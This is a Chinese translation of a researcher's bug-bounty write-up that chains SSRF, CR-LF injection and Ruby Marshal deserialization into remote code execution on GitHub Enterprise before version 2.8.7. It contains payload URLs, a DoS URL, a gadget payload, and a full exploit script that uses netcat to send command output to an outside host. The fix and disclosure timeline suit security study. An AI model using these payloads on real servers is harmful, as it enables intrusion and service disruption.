作者：[Orange](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) （orange@chroot.org ）  
知道创宇404实验室 独家授权翻译

过去几个月内，我花费大量时间准备 [Black Hat USA
2017](https://www.blackhat.com/us-17/speakers/Orange-Tsai.html) 和 [DEF CON
25](https://www.defcon.org/html/defcon-25/dc-25-speakers.html) 的演讲内容。成为 Black
Hat 与 DEF CON 演讲者是我一直以来的梦想。这也是我第一次在如此正式的场合发表英文演讲。真是一次难忘的经历啊 :P

在此感谢评审委员会给我这个机会。

本文主要介绍议题中的一个简单案例。案例中提及的并非是什么新技术，关键点在于如何化腐朽为神奇！感兴趣的朋友可以浏览下面链接中的 PPT 文件，其中涵盖了包括
SSRF 在内的更多新颖技术：

  * [“SSRF新纪元：攻击前沿编程语言中的URL解析器”（A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!） ](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

接下来，我就为大家展示如何将 GitHub 企业版存在的4个漏洞整合成一个远程代码执行攻击链。

这里还要炫耀一下，此项研究荣获 GitHub 第三届年度漏洞赏金计划（GitHub 3rd Bug Bounty Anniversary
Promotion）[最佳报告](https://github.com/blog/2332-bug-bounty-third-anniversary-wrap-up)奖哦！

#### 前言

我曾在[上篇博文](http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html)中谈到了 GitHub 企业版这个新目标，还演示了如何对 Ruby 代码进行反混淆处理、查找 SQL
注入。文章发布没多久，我就发现几位漏洞赏金猎人已经开始关注 GitHub 企业版并挖到许多优质漏洞，例如：

  * [“铺满伪造断言的代码库之路”（The road to your codebase is paved with forged assertions）](http://www.economyofmechanism.com/github-saml) by [ilektrojohn](https://twitter.com/ilektrojohn)

  * [“GitHub企业版远程代码执行漏洞”（GitHub Enterprise Remote Code Execution）](http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html) by [iblue](https://twitter.com/iblueconnection)

看到这些文章，挫败感顿时涌上心头，挖到漏洞的人为啥不是我 :(  
痛定思痛，暗下决心，自己也要挖一个高危漏洞。  
当然，要用独特的方式！

#### 漏洞

审视 GitHub 企业版架构之前，直觉告诉我，既然 GitHub 企业版提供了这么多内部服务，进去探索一番必有收获。

于是，服务端请求伪造（SSRF）成为我的关注焦点。

##### Bug No.1 无害的 SSRF 漏洞

在体验 GitHub 企业版的过程中，我注意到一个名为 `WebHook` 的有趣功能，能通过具体 GIT 指令定义定制化 HTTP 回调。

可以根据以下 URL 创建 HTTP 回调：

    
    
    https://<host>/<user>/<repo>/settings/hooks/new

提交文件触发 URL 后，收到 GitHub 企业版发送的 HTTP 请求。负载与请求如下所示：

Payload URL:

    
    
    http://orange.tw/foo.php

Callback Request:

    
    
    POST /foo.php HTTP/1.1
    Host: orange.tw
    Accept: */*
    User-Agent: GitHub-Hookshot/54651ac
    X-GitHub-Event: ping
    X-GitHub-Delivery: f4c41980-e17e-11e6-8a10-c8158631728f content-type: application/x-www-form-urlencoded Content-Length: 8972 
    
    payload=... 

GitHub 企业版采用 Ruby Gem `faraday` 获取外部资源，以防用户通过Gem `faraday-restrict-ip-addresses` 发送内部服务请求。

Gem看上去像一份黑名单，可以通过[RFC
3986](https://tools.ietf.org/html/rfc3986#section-7.4)定义的稀有IP地址格式（Rare IP
Address Formats）轻松绕过。在Linux中，`0` 表示 `localhost`

PoC：

    
    
    http://0/

Ok，现在我们已经获得一个 SSRF，但由于存在某些限制，还是什么都做不了，例如：

  * 仅限 POST 方法
  * 仅允许 HTTP 与 HTTPS 方案
  * 缺少 302 重定向
  * 在 `faraday` 中缺少 CR-LF 注入
  * 无法控制 POST 数据与 HTTP 报头

目前唯一可控的是 Path 部分。

需注意此 SSRF 可导致拒绝服务（DoS）攻击。

9200 端口绑定了一项 Elasticsearch 服务。在使用 `shutdown` 命令的过程中，Elasticsearch 根本不考虑 POST
数据的具体细节。所以，不妨尽情享用 REST-ful API :P

拒绝服务（DoS）PoC：

    
    
    http://0:9200/_shutdown/

  

##### Bug No.2 Graphite 内部服务 SSRF 漏洞

既然已经掌握了一个 SSRF，虽然存在诸多限制，但总该有些用处吧？ 是否存在可以利用的内网服务？

这个问题涵盖的范围可不小。首先，内网中存在几项不同的 HTTP 服务，而每项服务又采用不同的语言编写，例如C、C++、Go、Python、Ruby等。

经过几天的辛苦挖掘，我在 8000 端口找到一项名为 `Graphite` 的服务。这项服务拥有一个高度可扩展的实时图形系统，而 GitHub
正是通过该系统向用户展示一些数据。

`Graphite` 采用 Python 编写，也是一个开源项目，可以在[此处](https://github.com/graphite-project/graphite-web)下载源代码！

阅读源代码后很快找到另一个SSRF漏洞。

该漏洞位于 `webapps/graphite/composer/views.py` 文件，形式十分简单。

    
    
    def send_email(request):
        try:
            recipients = request.GET['to'].split(',')
            url = request.GET['url']
            proto, server, path, query, frag = urlsplit(url)
            if query: path += '?' + query
            conn = HTTPConnection(server)
            conn.request('GET',path)
            resp = conn.getresponse()
            ...

可以看到，Graphite 在收到用户输入的 url 后直接进行获取。因此，我们可以使用首个 SSRF 触发第二个 SSRF，并将它们并入到 **SSRF
执行链** 。

SSRF 执行链负载：

    
    
    http://0:8000/composer/send_email?
    to=orange@nogg&
    url=http://orange.tw:12345/foo 

第二个 SSRF 请求：

    
    
    $ nc -vvlp 12345 
    …
    
    GET /foo HTTP/1.1
    Host: orange.tw:12345 Accept-Encoding: identity 

现在，我们将基于 POST 的 SSRF 改写为基于 GET 的 SSRF，但暂时还是什么都做不了。

接下来，进入下一个阶段！

  

##### Bug No.3 Python CR-LF 注入漏洞

可以看到，`Graphite` 使用 `httplib.HTTPConnection` 获取资源。经过若干尝试与分析，我注意到
`httplib.HTTPConnection` 中存在一个 CR-LF 注入。这样就可以在 HTTP 协议中嵌入恶意负载了。

CR-LF注入PoC

    
    
    http://0:8000/composer/send_email?
    to=orange@nogg&
    url=http://127.0.0.1:12345/%0D%0Ai_am_payload%0D%0AFoo: 
    
    
    $ nc -vvlp 12345 
    ... 
    
    GET /
    i_am_payload
    Foo: HTTP/1.1
    Host: 127.0.0.1:12345 
    Accept-Encoding: identity 

看似一小步，对于整个攻击链而言却是一个巨大的飞跃。至少可以在这个 SSRF 执行链中伪造其他协议了，例如:

如果打算采用 Redis，可以尝试使用以下负载：

    
    
    http://0:8000/composer/send_email?
    to=orange@nogg& 
    url=http://127.0.0.1:6379/%0ASLAVEOF%20orange.tw%206379%0A 

注：SLAVEOF 是一个非常好用的命令，可以用来生成出站流量，在处理 Blind-SSRF 时相当有效。

看上去很美，但在协议伪造方面仍存在一些限制，例如：

  1. 不适用于 SSH、MySQL、SSL 等握手协议； 
  2. `Python2` 的局限性导致第二个 SSRF 中的负载仅允许使用介于 0x00 与 0x8F 之间的字节。

顺便提一下，HTTP 方案存在多种协议伪造方法。我的演讲 PPT 也介绍了如何利用 Linux Glibc 功能在 SSL SNI
中进行协议伪造，此外还提供了 Python CVE-2016-5699 漏洞绕过案例分析！

有兴趣的朋友不妨参考一下 :)

  

##### Bug No.4 危险的反序列化漏洞

现在，我们已经掌握了如何在 HTTP 协议中伪造其他协议，但问题随之而来，该伪造哪些协议呢？

经过一番周折后，终于发现在成功控制 Redis 或 Memcached 的前提下可以触发的漏洞类型。

查看代码的同时不禁产生了 GitHub 为何能够存储 Ruby 对象的疑问。进一步研究后发现 GitHub 企业版使用 Ruby Gem
`memcached` 处理缓存并用 Marsal 包装。

这对我来说可是个天大的好消息。Marsal 的杀伤力众所周知。

（不了解这一点的朋友可以阅读[@frohoff](https://twitter.com/frohoff)与[@gebl](https://twitter.com/gebl)在AppSec
California 2015会议上发表的议题[“Pickle 初体验：对象反序列化梦魇” / Marshalling Pickles: how
deserializing objects can ruin your day](https://frohoff.github.io/appseccali-marshalling-pickles/)）

至此，目标已经十分清晰了。

我们用 SSRF 执行链在 Memcached 中存储恶意 Ruby 对象。待到 GitHub 再次获取缓存时，Ruby Gem `mecached`
将自动对数据进行反序列化操作。结果可想而知……BOOM！远程代码成功执行！XD

Rails 控制台中的不安全 Marsal

    
    
    irb(main):001:0> GitHub.cache.class.superclass 
    => Memcached::Rails 
    
    irb(main):002:0> GitHub.cache.set("nogg", "hihihi") 
    => true 
    
    irb(main):003:0> GitHub.cache.get("nogg") 
    => "hihihi" 
    
    irb(main):004:0> GitHub.cache.get("nogg", :raw=>true) 
    => "\x04\bI\"\vhihihi\x06:\x06ET" 
    
    irb(main):005:0> code = "`id`" 
    => "`id`" 
    
    irb(main):006:0> payload = "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"
    => "\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\a:\u000E@instanceo:\bERB\a:\t@srcI\"\t`id`\u00 06:\u0006ET:\f@linenoi\u0000:\f@method:\vresult" 
    
    irb(main):007:0> GitHub.cache.set("nogg", payload, 60, :raw=>true) 
    => true 
    
    irb(main):008:0> GitHub.cache.get("nogg")
    => "uid=0(root) gid=0(root) groups=0(root)\n" 

现在，我们不妨对上述内容做个总结！

  1. 第一个SSRF：绕过 `Webhook` 现有保护 
  2. 第二个SSRF：`Graphite` 服务 SSRF 
  3. 将前两个 SSRF 整合到 SSRF 执行链 
  4. SSRF 执行链CR-LF注入 
  5. 伪造 Memcached 协议并插入恶意 Marsal 对象 
  6. 触发 RCE 

SSRF 攻击链构造

![](https://images.seebug.org/content/images/2017/08/final-1-.png-w331s)

完整代码可参见
[Gist](https://gist.github.com/orangetw/bbd592f5a32c59bbefefb3195c2df383) 与
[Youtube](https://www.youtube.com/watch?v=GoO7_lCOfic&feature=youtu.be) 视频

    
    
    #!/usr/bin/python
    from urllib import quote
    
    ''' set up the marshal payload from IRB
    code = "`id | nc orange.tw 12345`"
    p "\x04\x08" + "o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" + ":\x0E@instance" + "o"+":\x08ERB"+"\x07" + ":\x09@src" + Marshal.dump(code)[2..-1] + ":\x0c@lineno"+ "i\x00" + ":\x0C@method"+":\x0Bresult"
    '''
    marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`id | nc orange.tw 12345`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'
    
    payload = [
        '',
        'set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d' % len(marshal_code),
        marshal_code,
        '',
        ''
    ]
    
    payload = map(quote, payload)
    url = 'http://0:8000/composer/send_email?to=orange@chroot.org&url=http://127.0.0.1:11211/'
    
    print "\nGitHub Enterprise < 2.8.7 Remote Code Execution by orange@chroot.org"
    print '-'*10 + '\n'
    print url + '%0D%0A'.join(payload)
    print '''
    Inserting WebHooks from:
    https://ghe-server/:user/:repo/settings/hooks
    Triggering RCE from:
    https://ghe-server/search?q=ggggg&type=Repositories
    '''

  

#### 修复方案

为防止类似问题再次发生，GitHub 已完成多处改进！

  1. 提升 Gem `faraday-restrict-ip-address` 性能 
  2. 用定制 Django 中间件确保攻击者无法从外部抵达路径 `http://127.0.0.1:8000/render/`
  3. 增强使用 `User-Agent: GitHub-Hookshot` 模式阻止访问路径的 `iptables` 规则

    
    
    $ cat /etc/ufw/before.rules
    ...
    -A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp- flags PSH,ACK PSH,ACK --remove -m string --algo bm --string "User-Agent: GitHub-Hookshot" -j REJECT --reject-with tcp- reset
    ... 

  

#### 时间线

  * 2017/01/23 23:22 通过HackerOne将漏洞报告给GitHub，报告编号[200542](https://hackerone.com/users/sign_in)
  * 2017/01/23 23:37 GitHub将状态改为“已分类处理”（Triaged）
  * 2017/01/24 04:43 GitHub回应“该问题已得到验证、正在制定修复方案”
  * 2017/01/31 14:01 GitHub企业版2.8.7发布
  * 2017/02/01 01:02 GitHub回应“该问题已得到解决”！
  * 2017/02/01 01:02 GitHub颁发7,500美元漏洞赏金！
  * 2017/03/15 02:38 GitHub颁发5,000美元最佳报告奖金

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/363/>

